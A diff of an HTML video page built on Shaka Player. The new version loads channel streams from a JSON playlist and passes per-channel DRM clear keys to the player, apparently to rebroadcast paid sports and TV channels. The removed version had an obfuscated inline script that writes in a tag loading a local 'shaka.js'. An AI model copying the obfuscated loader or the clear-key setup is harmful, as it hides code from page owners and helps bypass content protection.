@@ -1,24 +1,139 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Shaka Player</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/shaka-player/4.7.11/shaka-player.ui.min.js" crossorigin="anonymous"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/shaka-player/4.7.11/controls.min.css" crossorigin="anonymous">
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    html, body { background: #000; height: 100vh; width: 100vw; overflow: hidden; font-family: sans-serif; }
-    .shaka-video-container { position: absolute; inset: 0; width: 100%; height: 100%; }
-    video { width: 100%; height: 100%; background: #000; object-fit: contain; }
-    .shaka-spinner-container { display: none !important; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shaka Player - JSON Loaded</title>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/shaka-player/4.7.11/shaka-player.ui.min.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/shaka-player/4.7.11/controls.min.css" crossorigin="anonymous">
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { 
+            background: #000; 
+            height: 100vh; 
+            width: 100vw; 
+            overflow: hidden; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+        }
+        
+        #shaka-wrapper { 
+            position: absolute; 
+            inset: 0; 
+            width: 100%; 
+            height: 100%; 
+        }
+        
+        video { 
+            width: 100%; 
+            height: 100%; 
+            background: #000; 
+            object-fit: contain; 
+        }
+
+        /* Hide default loading spinner if you prefer a clean look */
+        .shaka-spinner-container { display: none !important; }
+
+        /* Error Overlay Style */
+        #error-display {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            background: rgba(255, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 8px;
+            z-index: 100;
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
-  <div id="shaka-wrapper" class="shaka-video-container">
-    <video id="video-element" autoplay playsinline preload="metadata" poster="https://web.cricfoot.net/logo.png"></video>
-  </div>
-  <script>
-function _0x4a22(){var _0x465796=['write','3843050DjEnzG','6IKshKF','c=\x22shaka.j','3088696frSPjy','927377hYlDjE','2815064augWdr','18IGzXrz','s\x22></scrip','923255UprZXc','4ATIpJk','12awWkkn','<script\x20sr','51063aYoEcF','357832kCrVsM','132msjjse'];_0x4a22=function(){return _0x465796;};return _0x4a22();}var _0x5ea9b5=_0x2ad8;function _0x2ad8(_0x4b30ea,_0x1fcc56){_0x4b30ea=_0x4b30ea-(-0x4*-0x866+0xa6b*-0x1+-0x15d7*0x1);var _0x244dfc=_0x4a22();var _0x563d4c=_0x244dfc[_0x4b30ea];return _0x563d4c;}(function(_0x4fcb5c,_0x20fb37){var _0x56e237=_0x2ad8,_0x4feaea=_0x4fcb5c();while(!![]){try{var _0x3c0e8f=-parseInt(_0x56e237(0x163))/(0x148d*-0x1+-0x1d3*-0x5+0xb6f)*(-parseInt(_0x56e237(0x15f))/(-0x9b*-0xa+-0x5d1*0x2+0x596))+parseInt(_0x56e237(0x162))/(-0x1*-0x9ef+0x1b26+0xa*-0x3b5)*(-parseInt(_0x56e237(0x164))/(-0x4d9+-0x25e6+0x2ac3))+parseInt(_0x56e237(0x15e))/(-0x2b+0x1092*0x2+-0x20f4)*(parseInt(_0x56e237(0x157))/(-0x24+-0x168a+-0x1*-0x16b4))+parseInt(_0x56e237(0x15b))/(-0x382*0x8+0x1dd+-0x2ea*-0x9)+parseInt(_0x56e237(0x159))/(-0x738+-0xe8f*-0x2+-0x6*0x3a5)+parseInt(_0x56e237(0x15c))/(0x4*-0x75a+0x37c+0x1bb*0xf)*(-parseInt(_0x56e237(0x156))/(0x1*0x2278+-0xb8b+-0x16e3))+parseInt(_0x56e237(0x15a))/(0x1548+-0xe0*-0x8+-0x1*0x1c3d)*(parseInt(_0x56e237(0x160))/(-0x126e+-0x1*-0x48a+-0x4*-0x37c));if(_0x3c0e8f===_0x20fb37)break;else _0x4feaea['push'](_0x4feaea['shift']());}catch(_0x58d23f){_0x4feaea['push'](_0x4feaea['shift']());}}}(_0x4a22,-0xa8cc6+-0x10ec5*-0xa+0x6b9d2),document[_0x5ea9b5(0x165)](_0x5ea9b5(0x161)+_0x5ea9b5(0x158)+_0x5ea9b5(0x15d)+'t>'));</script>
+
+    <div id="shaka-wrapper" class="shaka-video-container">
+        <video id="video-element" autoplay playsinline preload="metadata" poster="https://web.cricfoot.net/logo.png"></video>
+        <div id="error-display">Stream Error: Failed to load content.</div>
+    </div>
+
+    <script>
+        async function initApp() {
+            // Install polyfills to patch browser incompatibilities
+            shaka.polyfill.installAll();
+
+            if (!shaka.Player.isBrowserSupported()) {
+                alert('Browser not supported!');
+                return;
+            }
+
+            const video = document.getElementById('video-element');
+            const container = document.getElementById('shaka-wrapper');
+            const player = new shaka.Player(video);
+            const ui = new shaka.ui.Overlay(player, container, video);
+            
+            // UI Configuration
+            const uiConfig = {
+                'controlPanelElements': ['play_pause', 'time_and_duration', 'spacer', 'mute', 'volume', 'fullscreen', 'overflow_menu'],
+                'addSeekBar': true
+            };
+            ui.configure(uiConfig);
+
+            try {
+                // 1. Fetch the external JSON playlist
+                // Note: File must be in the same directory or have CORS enabled
+                const response = await fetch('playlist.json');
+                if (!response.ok) throw new Error("Could not load playlist.json");
+                
+                const playlist = await response.json();
+
+                // 2. Identify channel from URL (e.g., index.html?id=bein1)
+                const urlParams = new URLSearchParams(window.location.search);
+                const channelId = urlParams.get('id') || "primehindi";
+                const selected = playlist[channelId];
+
+                if (!selected) {
+                    console.error("Channel ID not found in JSON data.");
+                    return;
+                }
+
+                // 3. Player Configuration (Stability Focus)
+                player.configure({
+                    streaming: {
+                        lowLatencyMode: false,
+                        bufferingGoal: 30,
+                        rebufferingGoal: 10,
+                        jumpLargeGaps: true,
+                        useNativeHlsOnSafari: true
+                    },
+                    manifest: {
+                        retryParameters: { maxAttempts: 5, baseDelay: 1000 }
+                    },
+                    drm: {
+                        clearKeys: selected.clearKeys || {}
+                    }
+                });
+
+                // Listen for errors
+                player.addEventListener('error', (event) => {
+                    console.error('Shaka Error:', event.detail);
+                    document.getElementById('error-display').style.display = 'block';
+                });
+
+                // 4. Load the URL from JSON
+                await player.load(selected.url.trim());
+                console.log("Stream loaded successfully:", channelId);
+
+            } catch (e) {
+                console.error("Initialization Error:", e);
+            }
+        }
+
+        // Initialize when UI is ready
+        document.addEventListener('shaka-ui-loaded', initApp);
+        // Fallback for direct loads
+        if (document.readyState === 'complete') { initApp(); }
+    </script>
 </body>
 </html>
